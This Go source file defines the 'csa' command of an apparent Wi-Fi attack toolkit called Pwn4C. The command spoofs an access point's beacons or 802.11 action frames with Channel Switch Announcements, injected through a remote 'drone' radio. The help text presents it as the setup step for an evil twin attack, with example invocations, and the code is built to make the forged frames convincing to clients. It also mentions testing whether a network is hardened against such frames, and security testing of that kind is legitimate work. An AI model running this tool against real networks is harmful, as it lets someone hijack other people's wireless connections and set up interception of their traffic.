package cmd

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
)

var (
	csaBSSID    string
	csaSSID     string
	csaChannel  int
	csaTo       int
	csaCount    int
	csaInterval int
	csaMode     string
	csaClient   string
	csaRate     float64
	csaFollow   bool
	csaTarget   string
)

var csaCmd = &cobra.Command{
	Use:   "csa [target_drone_ip]",
	Short: "Herd clients to another channel with Channel Switch Announcements",
	Long: `Spoofs the AP's own beacon (or an 802.11 Spectrum Management action frame)
with a Channel Switch Announcement element, telling associated clients to move
to another channel.

This is the setup step for an evil twin: a client that obeys the CSA looks for
its SSID on the new channel, where a rogue AP can answer. It is also the
cleanest way to test whether a network is CSA-hardened.

  pwn4c csa -b AA:BB:CC:DD:EE:FF -s "lab-net" -c 6 --to 11 -n 10
  pwn4c csa -b AA:BB:CC:DD:EE:FF -c 6 --to 11 --mode action --client 12:22:33:44:55:66

Beacon mode is broadcast and needs the SSID to look convincing: without -s the
SSID element is empty and most clients ignore the frame. Action mode is the
standard's unicast form, so prefer a real client MAC.

Each frame carries an incrementing sequence number and a countdown, because
clients drop copies with a repeated sequence number as duplicates.

Add --follow to leave the drone watching the new channel until Ctrl+C.`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		if csaBSSID == "" {
			fmt.Println("[!] --bssid is required: CSA has to look like the AP it impersonates.")
			os.Exit(1)
		}
		if _, err := net.ParseMAC(csaBSSID); err != nil {
			fmt.Printf("[!] Invalid BSSID %q: %v\n", csaBSSID, err)
			os.Exit(1)
		}
		if csaTo < 1 || csaTo > 13 {
			fmt.Println("[!] --to must be a channel between 1 and 13.")
			os.Exit(1)
		}
		if csaChannel < 1 || csaChannel > 13 {
			fmt.Println("[!] --channel must be between 1 and 13.")
			os.Exit(1)
		}
		if csaCount < 1 || csaCount > 1024 {
			fmt.Println("[!] --count must be between 1 and 1024.")
			os.Exit(1)
		}
		if csaInterval < 0 || csaInterval > 5000 {
			fmt.Println("[!] --interval must be between 0 and 5000 ms.")
			os.Exit(1)
		}
		if csaRate <= 0 || csaRate > 54 {
			fmt.Println("[!] --rate must be a positive PHY rate up to 54 Mbps.")
			os.Exit(1)
		}

		mode, err := drone.ParseCSAMode(csaMode)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			os.Exit(1)
		}
		if mode == drone.CSAModeAction && csaClient != "" && !isBroadcastMAC(csaClient) {
			if _, err := net.ParseMAC(csaClient); err != nil {
				fmt.Printf("[!] Invalid client MAC %q: %v\n", csaClient, err)
				os.Exit(1)
			}
		}

		target := csaTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)
		client := connectOrExit(target)
		defer client.Close()

		status, err := client.GetStatus()
		if err != nil {
			fmt.Printf("[!] Failed to query drone status: %v\n", err)
			os.Exit(1)
		}

		// Follow the radio the drone is already on unless -c was explicit:
		// announcing ch6 -> ch11 while listening on ch1 reaches nobody.
		channel := csaChannel
		if !cmd.Flags().Changed("channel") &&
			status.MonitorActive && status.Channel >= 1 && status.Channel <= 13 {
			channel = status.Channel
		}

		weStarted := false
		if !status.MonitorActive {
			fmt.Printf("[+] Activating monitor mode on channel %d...\n", channel)
			if err := client.StartMonitor(channel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				os.Exit(1)
			}
			weStarted = true
		} else if status.Channel != channel {
			fmt.Printf("[+] Switching channel from %d to %d...\n", status.Channel, channel)
			if err := client.SetChannel(channel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				os.Exit(1)
			}
		}

		if mode == drone.CSAModeBeacon && csaSSID == "" {
			fmt.Println("[!] No -s/--ssid: the beacon carries an empty SSID element,")
			fmt.Println("    which most clients ignore. Pass the real SSID.")
		}
		if mode == drone.CSAModeAction && isBroadcastMAC(csaClient) {
			fmt.Println("[!] Broadcast action frames are widely ignored; pass --client <MAC> when you can.")
		}

		opts := drone.DefaultFrameOptions()
		opts.Channel = channel
		opts.RateMbps = csaRate

		fmt.Printf("[+] Announcing ch%d -> ch%d with %d %s frame(s)...\n",
			channel, csaTo, csaCount, mode)

		var queued, dropped, pending int
		for i := 0; i < csaCount; i++ {
			frameHex, err := drone.BuildCSAFrame(drone.CSAParams{
				BSSID:         csaBSSID,
				SSID:          csaSSID,
				TargetChannel: csaTo,
				// A real AP counts down: 10, 9, 8 ... 1.
				Count:   csaCount - i,
				Seq:     uint16(i & 0x0fff),
				Client:  csaClient,
				Mode:    mode,
				Options: opts,
			})
			if err != nil {
				fmt.Printf("[!] %v\n", err)
				os.Exit(1)
			}

			res, err := client.InjectFrame(frameHex, 1, 0, int(csaRate))
			if err != nil {
				fmt.Printf("[!] Injection failed after %d frame(s): %v\n", i, err)
				os.Exit(1)
			}
			queued += res.Sent
			dropped += res.Failed
			pending += res.Pending

			if csaInterval > 0 && i < csaCount-1 {
				time.Sleep(time.Duration(csaInterval) * time.Millisecond)
			}
		}

		if pending > 0 {
			if err := waitForTxDrain(client, 10*time.Second); err != nil {
				fmt.Printf("[!] Warning: lost contact during TX: %v\n", err)
			}
		}
		fmt.Printf("[+] Injection: %d accepted, %d dropped, %d pending\n",
			queued, dropped, pending)

		if csaFollow {
			if err := client.SetChannel(csaTo); err != nil {
				fmt.Printf("[!] Failed to move the radio to channel %d: %v\n", csaTo, err)
			} else {
				fmt.Printf("[+] Radio on channel %d — watching for clients that obeyed.\n", csaTo)
			}
			fmt.Println("    Press Ctrl+C to stop.")
			waitForInterrupt()
		}

		if weStarted {
			fmt.Println("[*] Stopping monitor mode...")
			if err := client.StopMonitor(); err != nil {
				fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
			}
		}

		fmt.Println()
		fmt.Println("    Clients that honour CSA reassociate on the new channel.")
		fmt.Printf("    Confirm with: pwn4c monitor -c %s -o - | wireshark -k -i -\n",
			strconv.Itoa(csaTo))
	},
}

func init() {
	csaCmd.Flags().StringVarP(&csaBSSID, "bssid", "b", "", "AP BSSID to impersonate (required)")
	csaCmd.Flags().StringVarP(&csaSSID, "ssid", "s", "", "SSID to advertise in beacon mode")
	csaCmd.Flags().IntVarP(&csaChannel, "channel", "c", 1, "Channel the AP is currently on (1-13)")
	csaCmd.Flags().IntVar(&csaTo, "to", 0, "Channel to announce as the new channel (1-13, required)")
	csaCmd.Flags().IntVarP(&csaCount, "count", "n", 10, "Number of announcements to send")
	csaCmd.Flags().IntVar(&csaInterval, "interval", 50, "Milliseconds between announcements")
	csaCmd.Flags().StringVar(&csaMode, "mode", "beacon", "Frame form: beacon or action")
	csaCmd.Flags().StringVar(&csaClient, "client", "", "Client MAC for action mode (default: broadcast)")
	csaCmd.Flags().Float64Var(&csaRate, "rate", 1, "PHY TX rate in Mbps (1, 2, 5.5, 6, 11, 12, 24, 54)")
	csaCmd.Flags().BoolVar(&csaFollow, "follow", false, "Move the radio to the new channel and watch until Ctrl+C")
	csaCmd.Flags().StringVarP(&csaTarget, "target", "t", "", "Drone IP address")
	rootCmd.AddCommand(csaCmd)
}
